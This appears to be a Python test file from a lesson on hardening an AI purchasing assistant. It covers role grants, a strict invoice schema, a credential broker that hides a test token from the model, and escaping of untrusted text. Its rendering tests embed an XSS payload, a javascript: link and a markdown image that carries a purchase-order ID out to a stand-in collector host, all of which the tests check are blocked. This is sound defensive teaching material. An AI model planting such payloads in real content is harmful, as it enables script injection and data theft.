"""Lesson 16.4: role grants, typed extraction, a credential broker and safe rendering."""

import unittest
from decimal import Decimal

from pydantic import ValidationError

from agentlab.domain import Principal, ToolRequest
from agentlab.fixtures import load_purchases, load_supplier_message
from agentlab.model import ModelReply, ScriptedModel
from agentlab.security.assistant import FakeBackOffice, run_assistant
from agentlab.security.gate import authorize
from agentlab.security.privilege import ROLE_GRANTS, CredentialBroker, ExtractedInvoice, render_untrusted

TENANT_A = Principal(user_id="buyer-7", tenant_id="tenant-a")
SECRET = "tok-test-0000-not-real"
WRITE = {"po_id": "PO-1003", "status": "received"}


class RoleGrants(unittest.TestCase):
    def setUp(self):
        self.purchases = load_purchases()
        self.request = ToolRequest(run_id="r1", operation_id="op1", tool="write_purchase_record", arguments=WRITE)

    def test_the_mail_reader_cannot_write_records_even_with_a_perfect_request(self):
        decision = authorize(self.request, TENANT_A, ROLE_GRANTS["mail_reader"], self.purchases)
        self.assertFalse(decision.allowed)
        self.assertIn("not granted", decision.reason)

    def test_the_same_request_passes_for_the_role_that_owns_the_write(self):
        self.assertTrue(authorize(self.request, TENANT_A, ROLE_GRANTS["records_clerk"], self.purchases).allowed)

    def test_the_mail_reader_in_a_run_writes_nothing(self):
        office = FakeBackOffice(load_purchases())
        model = ScriptedModel([ModelReply(tool_call={"name": "write_purchase_record", "arguments": WRITE}), ModelReply(text="done")])
        run_assistant(model, load_supplier_message("benign"), TENANT_A, ROLE_GRANTS["mail_reader"], office.tools(), office.purchases)
        self.assertEqual(office.record_writes, [])


class TypedExtraction(unittest.TestCase):
    def test_the_two_fields_the_drafter_needs_parse(self):
        extracted = ExtractedInvoice.model_validate_json('{"po_id": "PO-1002", "total": "1134.00"}')
        self.assertEqual(extracted.total, Decimal("1134.00"))

    def test_a_payee_or_approval_field_has_nowhere_to_go(self):
        with self.assertRaises(ValidationError):
            ExtractedInvoice.model_validate_json('{"po_id": "PO-1002", "total": "1134.00", "payee": "Supplier Omega"}')
        with self.assertRaises(ValidationError):
            ExtractedInvoice.model_validate_json('{"po_id": "PO-1002", "total": "1134.00", "approved": true}')


class Broker(unittest.TestCase):
    def setUp(self):
        self.sent = []

        def transport(url, headers, body):
            self.sent.append((url, headers, body))
            # A careless service that echoes the caller's header back in its reply.
            return {"status": "ok", "debug": headers["Authorization"]}

        self.broker = CredentialBroker(routes={"lookup_po": "https://erp.example.test/po"}, secret=SECRET, transport=transport)

    def test_the_secret_reaches_the_service_for_an_allowlisted_call(self):
        self.broker.call("lookup_po", {"po_id": "PO-1001"})
        self.assertEqual(self.sent[0][1]["Authorization"], f"Bearer {SECRET}")

    def test_an_unlisted_tool_gets_no_call_and_no_secret(self):
        with self.assertRaises(PermissionError):
            self.broker.call("send_email", {"to": "records@collector.invalid"})
        self.assertEqual(self.sent, [])

    def test_the_secret_never_reaches_the_model(self):
        office = FakeBackOffice(load_purchases())
        tools = {"lookup_po": lambda arguments: self.broker.call("lookup_po", arguments)}
        model = ScriptedModel([ModelReply(tool_call={"name": "lookup_po", "arguments": {"po_id": "PO-1001"}}), ModelReply(text="done")])
        outcome = run_assistant(model, load_supplier_message("benign"), TENANT_A, ROLE_GRANTS["mail_reader"], tools, office.purchases)
        self.assertEqual(len(self.sent), 1)
        self.assertNotIn(SECRET, repr(model.calls))
        self.assertNotIn(SECRET, repr(outcome))
        self.assertNotIn(SECRET, repr(self.broker))
        self.assertIn("[redacted]", model.calls[1][-1]["content"])


class SafeRendering(unittest.TestCase):
    def test_markup_is_shown_as_text(self):
        rendered = render_untrusted('Paid <img src=x onerror="alert(1)">')
        self.assertNotIn("<img", rendered)
        self.assertIn("&lt;img", rendered)

    def test_links_and_images_lose_their_target(self):
        rendered = render_untrusted("Status: ![ok](https://collector.invalid/p?d=PO-1002) and [portal](javascript:alert(1)) or https://collector.invalid/x")
        self.assertNotIn("collector.invalid", rendered)
        self.assertNotIn("javascript:", rendered)
        self.assertIn("ok [link removed]", rendered)

    def test_plain_text_is_unchanged(self):
        self.assertEqual(render_untrusted("Invoice total: USD 500.00, net 30."), "Invoice total: USD 500.00, net 30.")


if __name__ == "__main__":
    unittest.main()
